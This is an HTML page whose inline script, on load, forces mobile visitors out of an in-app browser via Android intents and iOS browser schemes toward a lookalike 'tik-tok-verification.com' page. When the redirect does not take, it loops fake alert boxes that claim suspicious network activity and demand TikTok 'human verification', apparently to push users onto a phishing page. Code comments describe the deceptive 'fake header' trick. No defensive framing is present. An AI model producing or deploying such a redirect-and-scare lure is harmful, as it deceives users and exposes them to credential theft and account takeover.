<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 15000;

    function triggerDirectBrowser() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const urlNoProtocol = targetUrl.replace("https://", "");

        if (isAndroid) {
            // Android: This Intent forces Chrome specifically
            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
        } else {
            // iOS: Force Safari/Chrome by using the 'googlechrome://' and 'x-web-search' schemes
            // These specifically tell iOS to look for a browser, not the App Store.
            window.location.href = "googlechrome://" + urlNoProtocol;
            
            // Fallback for Safari
            setTimeout(() => {
                window.location.assign(targetUrl);
            }, 50);
        }
    }

    function runSystem() {
        if (Date.now() > killTime) return;

        // 1. Fire the Redirect first
        triggerDirectBrowser();

        // 2. FOCUS CHECK: Wait 100ms to see if the browser took over
        setTimeout(() => {
            if (document.hasFocus()) {
                // FAKE HEADER: We use \n (new lines) and capitalization to create a visual header
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "____________________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // Re-fire after user clicks OK
                triggerDirectBrowser();
                
                // Keep the loop tight
                setTimeout(runSystem, 100);
            }
        }, 100);
    }

    window.onload = runSystem;
    window.onfocus = () => { if (Date.now() < killTime) runSystem(); };
</script>

</body>
</html>
